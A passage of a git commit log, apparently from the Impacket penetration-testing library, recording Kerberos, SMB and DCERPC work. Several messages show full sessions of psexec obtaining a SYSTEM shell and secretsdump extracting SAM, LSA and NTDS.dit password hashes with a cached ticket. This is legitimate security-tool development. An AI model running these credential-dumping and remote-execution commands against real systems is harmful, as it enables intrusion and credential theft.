       <extension> = <pathname>
    for example:
       bat = /tmp/batchfile
       com = /tmp/comfile
       exe = /tmp/exefile
    
    ToDo:
    [ ] A lot of testing needed under different OSes
    [X] It's not working for first level directories
        (e.g. \\IP\share\file) - DONE
    [ ] Add support for other SMB read commands. Right now just
        covering SMB_COM_NT_CREATE_ANDX
    
    I'm not sure how reliable this approach is, so I might ditch this in the future.. hopefully no!

commit ccc3f55f2aee09dade22513201e64c8c33a2879e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 11 21:42:06 2015 +0000

    Fixed bug in transaction hook functions

commit 67bdc297120c5f3c96ec5c0710aa90352cf75a74
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 21:10:55 2015 +0000

    Fixed wrong calling of SBMConnection.readFile()

commit 2f3e335f13e8a7bcfd929d1fd09691cc050e9e1e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 21:02:53 2015 +0000

    Adding kerberos test cases

commit 33e17a79e73f93b9a8c396d06b772ae4442eec33
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 20:59:12 2015 +0000

    From now on, when doing ncacn_np communications, we're not using transactions anymore, now calling directly to writeFile

commit 06b8b563e15553b2380a8462ecf7a09f690f6373
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 18:08:22 2015 +0000

    Adding Kerberos test_cases

commit feec49e6d4235256d6924e2ca390efdefb67e918
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 14:20:54 2015 +0000

    Better error checking for suplementalCredentials. It was failing on some old XP systems

commit 7634f3e526f5b0c1028914a227ef8395cf11606d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 13:47:50 2015 +0000

    If we receive KDC_ERR_ETYPE_NOSUPP, we give it another try using RC4 (if not
    used before) and hope for the best.
    Seems to be a decent way to make kerberos work against some old Windows XP
    boxes. Still having some problems at the DCERPC level tho.

commit aa048d45f15b5fc57a58f718f4776d56ccba7a09
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 22:07:23 2015 +0000

    If we receive KDC_ERR_ETYPE_NOSUPP, we give it another try using RC4 (if not used before) and hope for the best.
    Seems to be a decent way to make kerberos work against some old Windows XP boxes. Still having some problems at the DCERPC level tho.

commit be4980960c0b158b5e82f50fdc6ba9e2e30c90b5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 00:17:37 2015 +0000

    When calculating the stringBinding.. convert what we receive to uppercase.

commit c39c79c889d861e2c670f0d1ae13587d1a380932
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 00:17:13 2015 +0000

    Trying to decode a KerberosError if it happens.. still not perfect.. we should interpret the krb5_blob here

commit 38a915a0541ff0c8edb2f28eb8bfc7f044378859
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 23:51:38 2015 +0000

    Forgot one raise ;)

commit 9a9b40225276a0f19abf7a021f9218ff786b8aa8
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 23:48:28 2015 +0000

    Attack might have worked, but when asking for the cifs TGS we get KDC_ERR_ETYPE_NOSUPP. If that happens, we try all over again using RC4

commit 2d119b71cee41eff851d374e1e1ea2b534559fbd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 22:40:50 2015 +0000

    Fixed typo

commit cc3e726c764519a52a8386226348cf9703e05d63
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 5 20:23:26 2015 +0000

    Replacing Crypto.Random.get_random_bytes for our own implementation

commit 1765c3984a0821ebccb3c31f6893680dac192c34
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:49:33 2015 +0000

    Kerberos support added

commit 1f6095f0133992a68f695066fbba80fd4ca926a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:32:21 2015 +0000

    Removing traceback

commit 72fd4ec15aaac83932a960a282cae989b1f9cb5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:31:39 2015 +0000

    GSSAPI_AES128 support

commit 0c4d21c073a665513e1abbff6264946023d1ba1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 13:52:43 2015 +0000

    Credentials are now passed by command line, aligned with other scripts. You can still logoff/logon inside the mini shell tho.

commit 2d04544c44d5e0c7cd9fda43a237849757ccc8e9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 21:21:36 2015 +0000

    service install ported to the new dcerpc.v5

commit 32e10b80271185597a3ea4579787495b140c73ee
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 19:56:17 2015 +0000

    Add domain FDQN whenever possible

commit f2ff812d3b347d0ea4144fb5122fb99652d3d069
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:52:36 2015 +0000

     Adding support for pass the key

commit b3c614ab6b38ae6446fb898fd44a967ceedf4336
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:28:37 2015 +0000

    Adding support for pass the key

commit 27f0b5b43d7b970f84e2f7ddfac6e125e6fca834
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:19:12 2015 +0000

    This changeset adds support for Kerberos pass the key, originally implemented by Benjamin Delpy (@gentilkiwi) in mimikatz.

commit 2fd3bf2289f30d0cdf1c81cb930484b1f43d7240
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 00:18:21 2015 +0000

    Adding parsing of [MS-SAMR] 2.2.10 Supplemental Credentials Structures. I'm just grabbing the kerberos keys, just the "new" ones. I could grab the WDigest data... but still don't know how to use them effectively.
    How to use these kerberos keys?.. coming soon.

commit 20ea3c498546289378ab51f45cf54e2c395491d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 00:06:38 2015 +0000

    Adding [MS-SAMR] 2.2.10 Supplemental Credentials Structures structure

commit 38c59dd9977c456daa1ac3054af601c31cadd1f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 29 19:34:23 2015 +0000

    Adding capability to export to John The Ripper format files

commit 32ec8ab90fff2717ebeef33bdb25b1ada49b8315
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 27 15:10:29 2015 +0000

    Adding support for SMB Encryption. It will be used if the target server requires it either at session or share level using AES_CCM. Current stable pycrypto does NOT support this mode. For this feature to work you will need to download/compile and install the experimental version. Currently it is https://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.7a1.tar.gz

commit e7ff108eced16286ceeb1c8c57845e08289e4819
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 23 12:54:36 2015 +0000

    Updated description

commit 51215ea8017dacc1d0617dc05243fe3271a56437
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:35:25 2015 +0000

    Ported to dcerpc.v5

commit bdaaf07616d6f954897a5056ca31444df3906a9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:06:21 2015 +0000

    DCE [C706] MGMT Interface Implementation

commit 98b5269290487362e6cf02fdffcbe746672e90bf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:02:38 2015 +0000

    Ability to avoid checking errors in the DCE RPC answer (needed for mgmt interface)

commit 5fd8e8753dceaefe94cd54c5e54cc86fb8f9b395
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 20:34:15 2015 +0000

    Changing pad calculation for arrays when TS is NDR64

commit 90c38e248f7e111704375e71109fe2c7c21955cf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 23:35:57 2015 +0000

    Added deprecation warning message to all non dcerpc.v5 classes

commit 29d18e8cfde391cd5d5194bce5d236a585642425
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 22:53:16 2015 +0000

    Updated copyright

commit 6957420118347d698496e75ff47196d3c0fdc248
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 19:59:06 2015 +0000

    Removing -port parameter. Not needed

commit 3c2e430b6dd3e09305a892cf6718fda3a50dcecd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 17:12:26 2015 +0000

    1) kerberosv5.py: Fixing typo in error message
    2) smb.py: When building the principal name, the remote_name should be used instead of remote_host
    3) smb3.py: getaddrinfo should be done on the self._Connection['ServerIP'] variable

commit 15228f4563f24be92872faf99de5fc3f3204a4aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 15:07:34 2015 +0000

    Adding get and put commands to the semi-interactive shell. You can include drive letters as destination pathnames as well. It'll use the drive letter as the share (plus '$') to connect to.

commit dd1500e65f457b15f9baa9545c073d153bde5e4a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:30:14 2015 +0000

    upgrading to dcerpc.v5

commit d7a4be2ef84a00c16e4be5b145184c304294112f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:26:53 2015 +0000

    Removing unnecesary imports

commit 14515391aa5b3ca8c24a5929373c72fd094e5636
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:25:56 2015 +0000

    Getting rid of the old dcerpc library.. now using dcerpc.v5

commit bbce63a34a6b14e434cb35d7e881f975ea10242a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 16:32:03 2015 +0000

    Clarifying target could be an IP address or targetName

commit b4cacea6afc6dc5c7e03aa4d55cf6520e21837b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 13 21:01:41 2015 +0000

    Sending ServerName = '\x00' instead of NULL. Older Samba implementation fails to accept NULL as paramenter.

commit 747f8848beb43572a47826d53fbfabb117ac77c4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:22:33 2015 +0000

    1) Better error reporting when we cannot resolve a hostname and when domain is not specified
    2) Improved the way we calculate offsets inside authData for WRAP structure parsing

commit 6439379c7c24e72a67187a5b02035eff09bbc008
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:17:27 2015 +0000

    Added debug output flags. Nothing much is outputed now but migth be useful in the future

commit a5d7e7dad7b71aff82690e17588c3421b1ebf142
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:16:10 2015 +0000

    Since targets can be IP addresses or hostnames, I'm changing some internal variables/methods names to be consistent.

commit 107b3bc6a162e5494fb3242be06161fc6c92a68c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:55:22 2015 +0000

    Copyright update

commit 661145e669185f5baa255def308ac56b1896b81b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:52:47 2015 +0000

    Updated documentation about AES256-CTS-HMAC-SHA1-96.

commit 1334f7bd4b5b170c1300166c38f74bfd75224428
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:44:50 2015 +0000

    Enabling AES128-CTS-HMAC-SHA1-96 support for all Kerberos operations (including goldenPac.py). RC4 would be used only when hashes are specified or KDC_ERR_ETYPE_NOSUPP is returned when trying AES.

commit 17e23eaa527baa7a503a238505d032b3fafee9f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 20:50:32 2015 +0000

    GSS_Wrap and GSS_Unwrap for AES256.. finally.. closer we are..

commit 27bbf85a2d42f97adb3d0837a392fa8a4045cb0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:11:07 2015 +0000

    Kerberos support added (incl. ccache)

commit ad1959a0258ad158a5234949aea57660757d2752
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:07:49 2015 +0000

    Kerberos support (incl. ccache)

commit 700bbb6d9f9d5b2198976367686c0645142b542b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:03:02 2015 +0000

    Kerberos support (incl. ccache) for psexec.
    
    jack:examples beto$ klist
    Credentials cache: FILE:/Users/beto/ccache
            Principal: normaluser7@FREEFLY.NET
    
      Issued                Expires               Principal
    Jan  8 20:11:32 2015  Jan  9 06:11:32 2015  krbtgt/FREEFLY.NET@FREEFLY.NET
    jack:examples beto$ python psexec.py -k -no-pass freefly.net/normaluser7@freefly-dc cmd.exe
    Impacket v0.9.13-dev - Copyright 2002-2015 Core Security Technologies
    
    Trying protocol 445/SMB...
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [*] Requesting shares on freefly-dc.....
    [*] Found writable share ADMIN$
    [*] Uploading file oaZRkqjh.exe
    [*] Opening SVCManager on freefly-dc.....
    [*] Creating service gpvj on freefly-dc.....
    [*] Starting service gpvj.....
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    [!] Press help for extra shell commands
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Windows\system32>whoami
    nt authority\system
    
    C:\Windows\system32>

commit 8953ece80adc91c3bc0bb5bee6c3c7e8c6afa129
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 23:26:02 2015 +0000

    We're forcing connectTree to use the target's IP address instead of its name. Might bring some issues.. not completely sure yet

commit fa6950ede474af5a4862d0b1c84d65d3bcae7bc9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:28:44 2015 +0000

    Adding -no-pass switch, uniform with the other scripts we're adding kerberos support to

commit ed89b315b74aa8a564ec6d27b0d5b5a0f922dce6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:24:29 2015 +0000

    removed import that was not used

commit 5b8e9981d929bc0ce2c59deaf95af497cb0ada8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:22:41 2015 +0000

    Duplicate import

commit ebeacd25ca1a409c805b3b07281be60b9ac023a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:18:27 2015 +0000

    Adding kerberos get/setter to the base transport class so we can do kerberos through the transport factory

commit 1d8f3a9a83a02092b75719d252ac29ca578dcdca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 20:22:59 2015 +0000

    Better handling of NTLMAuthChallengeResponse.getData()/fromString(). Still not perfect since it's not possible to know whether the MIC field will be there or not w/o inspecting the Challenge message's AV PAIRS.

commit 5c6005027673c34101df58d18bfb44018453cde5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 16:17:55 2015 +0000

    Adding  getActiveConnections()

commit a170f7a02c1d65a506e0563655282e2841af5563
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 13:28:46 2015 +0000

    Added -dc-ip option, in case you want to target an specific domain controller or cannot resolve

commit 015c4efd28d960d9dbd2d0c6f5392368c3dac1af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 00:57:32 2015 +0000

    1) Sequence number needs to be reseted when altering contexts
    2) Removing CCache status messages for RPC since it generates a lot of noise

commit 634aac146194c8076b2466c38e3811e56277e253
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:56:32 2015 +0000

    Happy new year :)

commit 5372825c7f4855f0d19ce7d7b25dccb388a66b04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:56:08 2015 +0000

    Kerberos support for secretsdump.py. Matches the same usage of wmiexec.py (e.g. -no-pass switch)
    
    Examples:
    
    jack:impacket beto$ klist -v
    Credentials cache: FILE:/Users/beto/ccache
            Principal: Administrator@FREEFLY-2012R2.NET
        Cache version: 4
      KDC time offset: -1 second
    
    Server: krbtgt/FREEFLY-2012R2.NET@FREEFLY-2012R2.NET
    Client: Administrator@FREEFLY-2012R2.NET
    Ticket etype: arcfour-hmac-md5, kvno 2
    Ticket length: 1155
    Auth time:  Jan  7 18:43:10 2015
    End time:   Jan  8 04:43:08 2015
    Ticket flags: enc-pa-rep, pre-authent, initial, proxiable, forwardable
    Addresses: addressless
    
    jack:examples beto$ python secretsdump.py -k -no-pass FREEFLY-2012R2.NET/Administrator@FFLY-2012R2-DC
    Impacket v0.9.13-dev - Copyright 2002-2015 Core Security Technologies
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0x22d7b24d8eb4032e9ba9baaf0f4f6b93
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:ebd8ac3ca25e615c406c2c15b44a6ca6:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    FREEFLY-2012R2\FFLY-2012R2-DC$:aad3b435b51404eeaad3b435b51404ee:0f88dee50c20e5a7c479df5c0ed94297:::
    [*] DefaultPassword
    (Unknown User):ROOT#123
    [*] DPAPI_SYSTEM
     0000   01 00 00 00 FC 8A 2B 5A  CE F6 FF 89 5D 0A C9 08   ......+Z....]...
     0010   62 60 22 29 D3 C0 19 41  B1 4D F7 B5 D7 68 72 75   b`")...A.M...hru
     0020   DE 37 EA 67 1B 20 FA D5  A8 1A F8 C1               .7.g. ......
    [*] NL$KM
     0000   9E B3 1A 1B C7 7F 28 87  9D D3 23 EB 9A 13 D6 FC   ......(...#.....
     0010   B8 E7 41 DE 8A F6 2B 4E  57 91 36 0D AD B5 39 8A   ..A...+NW.6...9.
     0020   86 4D D8 30 ED 0E 97 68  0B 0A 87 E5 D1 03 E5 8F   .M.0...h........
     0030   A2 ED 0C 75 C5 F3 DB 69  2C CD BB 1E 4C 82 C1 29   ...u...i,...L..)
    [*] Searching for NTDS.dit
    [*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] Pek found and decrypted: 0xe2f4cbb594d082e5ddc8bf0fb9892746
    [*] Reading and decrypting hashes from \\FFLY-2012R2-DC\ADMIN$\Temp\oBqCwVyB.tmp
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:eba8ac3cb25e605c606b2c15b43a6ca6:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    FFLY-2012R2-DC$:1001:aad3b435b51404eeaad3b435b51404ee:0f88def50c20e5a8c479df6c0ed94297:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98fceba6f84d49a9837e6cf992c926ec:::
    FREEFLY-2012R2.NET\user1:1104:aad3b435b51404eeaad3b435b51404ee:2f5de3f35895d71d9cf16e52511cb692:::
    [*] Cleaning up...
    [*] Stopping service RemoteRegistry
    [*] Cleaning up...
    [*] Stopping service RemoteRegistry

commit b58f9379e50e0a3a7bdf80f73d09075b3371ed5f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:45:09 2015 +0000

    Kerberos support for wmiexec. It can use cached tickets or specified credentials.
    
    jack:examples beto$ kinit Administrator@FREEFLY-2012R2.NET
    Administrator@FREEFLY-2012R2.NET's Password:
    jack:examples beto$ klist -v
    Credentials cache: FILE:/Users/beto/ccache
            Principal: Administrator@FREEFLY-2012R2.NET
        Cache version: 4
      KDC time offset: -1 second
    
    Server: krbtgt/FREEFLY-2012R2.NET@FREEFLY-2012R2.NET
    Client: Administrator@FREEFLY-2012R2.NET
    Ticket etype: arcfour-hmac-md5, kvno 2
    Ticket length: 1155
    Auth time:  Jan  7 18:43:10 2015
    End time:   Jan  8 04:43:08 2015
    Ticket flags: enc-pa-rep, pre-authent, initial, proxiable, forwardable
    Addresses: addressless
    
    jack:examples beto$ python wmiexec.py -no-pass -k FREEFLY-2012R2.NET/Administrator@FFLY-2012R2-DC
    Impacket v0.9.13-dev - Copyright 2002-2014 Core Security Technologies
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    SMBv3.0 dialect used
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [!] Launching semi-interactive shell - Careful what you execute
    C:\>whoami
    freefly-2012r2\administrator
    
    C:\>

commit 83f871605ddd4f716ad4c1cdaf3293caabce4d00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:42:36 2015 +0000

    Kerberos support for DCOM.

commit d9f6c98941c90dc3035c669c52df2cfa9d9c8e92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 16:49:49 2015 +0000

    1) Replacing NTLM_AUTH_* for RPC_C_AUTHN_*
    2) String binding calculation now has in mind the target_ip can actually be a netbios name

commit 81598e19bc30274cd0e05102175bbc83ba343e60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 6 19:26:15 2015 +0000

    More GSSAPI stuff. Right now, RPC SIGN/SEAL should be working for RC4. AES still not there

commit 6ce21783a4bb3ed018d56e7c5158aee3fe460551
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 4 21:52:54 2015 +0000

    typo in constant name (not value)

commit 41a2a0f64297c2cd4a6d75546cb5e1fb1f2591e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 4 19:48:28 2015 +0000

    Support for RPC_C_AUTHN_LEVEL_PKT_PRIVACY for Kerberos. RC4 only so far

commit 17323a5f8d344a7abc96d28292b480bb1025b2cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 22 21:01:34 2014 +0000

    Kerberos support for samrdump

commit ed1eaed9825a370df9c2d1c445f5949ff91c7cbf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 22 20:54:59 2014 +0000

    Adding RPC_C_AUTHN_GSS_NEGOTIATE support for DCERPC. Not yet functional, although I can now bind using Kerberos as SSP. Still needing to work on the authenticators for signing/sealing.

commit d3d623ffe70c3dc025820850863400fc3e41ec73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:54:14 2014 +0000

    All domains in uppercase.. just in case

commit fd638816dff817d16bd567913bda46f28ce0eefe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:31:51 2014 +0000

    Adding -w ability to save the goldenPac y CCache format

commit 82fed57e303166408ad8613a7806ec170c57d784
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:30:58 2014 +0000

    Adjusting to new getKerberosTGT, getKerberosTGS output

commit db0c491213179798f309a619564083e8bdafc34a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:28:57 2014 +0000

    1) Better parsing of ETYPE_INFO and ETYPE2_INFO
    2) Better handling of etypes
    3) Support for writing CCache files

commit dd7516b9e36e754d7e8b6fa3def1134da69dc1bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 20:06:15 2014 +0000

    opening the file with 'rb' for our Windows friends

commit 4386b864ba3845d1302c92f2454c8fbdba15694d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:44:13 2014 +0000

    Improved getMachineNameAndDomain() in case we can't get the data the normal way. Now it will try RPC against wkst. This is needed when authenticating using Kerberos.

commit 11a3ac8df300d13b4989b73e085641e447ef0fd1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:20:01 2014 +0000

    Disabling AES256/128 until I figure a bug out

commit 0e7f2bc32ad8528fb62b01c03b864aad2da6e7cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 16:12:40 2014 +0000

    An example added for the -c flag

commit 4b54788c2b4c97aa59bcad8eeb6bf1936196d5fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 16:09:06 2014 +0000

    1) kerberosLogin will never use cached tickets (useCache = False)
    2) Added -c flag, uploads a binary and executes it

commit 8d4fe046ebdd35fe038cc0d9c49863978ed3a924
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 21:33:33 2014 +0000

    My first take on Kerberos support for secretsdump.py.. Two ways to use it
    1) Have cached tickets in your ccache file (pointed by KRB5CCNAME). E.g.
        kinit beto@FREEFLY.NET (my password will be asked)
        klist -v
        secretsdump.py -k FREEFLY.NET/beto@FREEFLY-DC
    
    2) Use the specified command line credentials. e.g.
        secretsdump.py -k FREEFLY.NET/beto:myPassword@FREEFLY-DC

commit fe290c618005344a785f3b16c98ee507e9c5fa10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 19:21:27 2014 +0000

    Printing out the domain+rid = userSid.. might be useful for some ppl

commit 0a84907c4562fcf2455ae0959bbb042256a11b2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 16:44:10 2014 +0000

    Support for AES128 and AES256. If hashes are specified, RC4 will be choosen.

commit ed4e2c35d952bd526edec00e9f309c2f64b0e275
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
